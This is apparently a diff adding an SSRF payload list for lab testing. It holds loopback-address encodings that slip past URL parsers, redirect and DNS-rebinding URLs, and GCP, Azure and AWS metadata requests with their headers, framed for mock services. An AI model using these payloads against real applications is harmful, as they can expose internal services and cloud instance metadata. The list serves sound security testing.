@@ -1,0 +1,52 @@
+# SSRF Parser, Redirect and Cloud Context Payloads
+
+# Controlled callback paths: a server-side marker callback proves a request, not internal data exposure
+https://collector.example.test/ssrf/direct-marker
+https://collector.example.test/ssrf/pdf-marker
+https://collector.example.test/ssrf/image-marker
+{"url":"https://collector.example.test/ssrf/webhook-marker","event":"ssrf-lab-control"}
+
+# Redirect chain: configure each location on the controlled redirect server, then observe each hop
+https://redirect.example.test/ssrf/one-hop-to-loopback
+https://redirect.example.test/ssrf/two-hops-to-loopback
+https://redirect.example.test/ssrf/redirect-to-ipv6
+https://redirect.example.test/ssrf/scheme-change
+
+# URL parser / normalization controls; library acceptance varies, so record parsed host and connected peer
+http://127.1:8080/ssrf-lab/identity
+http://0177.0.0.1:8080/ssrf-lab/identity
+http://2130706433:8080/ssrf-lab/identity
+http://[::ffff:7f00:1]:8080/ssrf-lab/identity
+http://[0:0:0:0:0:ffff:7f00:1]:8080/ssrf-lab/identity
+http://localhost.:8080/ssrf-lab/identity
+http://allowed.example.test@127.0.0.1:8080/ssrf-lab/identity
+http://127.0.0.1:8080/ssrf-lab/identity#allowed.example.test
+http://allowed.example.test\@127.0.0.1:8080/ssrf-lab/identity
+
+# DNS rebinding sequence: controlled DNS zone and private mock server only
+http://rebind.example.test:8080/ssrf-lab/dns-marker
+
+# In a mock metadata service, send GET /computeMetadata/v1/instance/id with the header below.
+Metadata-Flavor: Google
+http://metadata.google.internal/computeMetadata/v1/instance/id
+
+# Azure metadata context: harmless instance metadata, mock service first
+Metadata: true
+http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01&format=json
+
+# AWS IMDSv2 sequence: mock PUT issues a synthetic token; GET requires that token
+X-aws-ec2-metadata-token-ttl-seconds: 60
+# Request 2: GET /latest/meta-data/instance-id using the mock token header.
+X-aws-ec2-metadata-token: LAB_IMDSV2_TOKEN
+http://169.254.169.254/latest/meta-data/instance-id
+http://[fd00:ec2::254]/latest/meta-data/instance-id
+
+# Lab fetcher JSON: only relevant when the application actually exposes method/header configuration
+{"url":"http://metadata-mock.example.test/computeMetadata/v1/instance/id","method":"GET","headers":{"Metadata-Flavor":"Google"}}
+{"url":"http://metadata-mock.example.test/metadata/instance/compute?api-version=2021-02-01&format=json","method":"GET","headers":{"Metadata":"true"}}
+{"url":"http://metadata-mock.example.test/latest/api/token","method":"PUT","headers":{"X-aws-ec2-metadata-token-ttl-seconds":"60"}}
+{"url":"http://metadata-mock.example.test/latest/meta-data/instance-id","method":"GET","headers":{"X-aws-ec2-metadata-token":"LAB_IMDSV2_TOKEN"}}
+
+# Processing entry points: independently verify which component made the request using fixture logs
+<html><body><img src="https://collector.example.test/ssrf/pdf-image-control" alt="SSRF PDF fixture"></body></html>
+<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16"><image href="https://collector.example.test/ssrf/svg-image-control" width="16" height="16"/></svg>
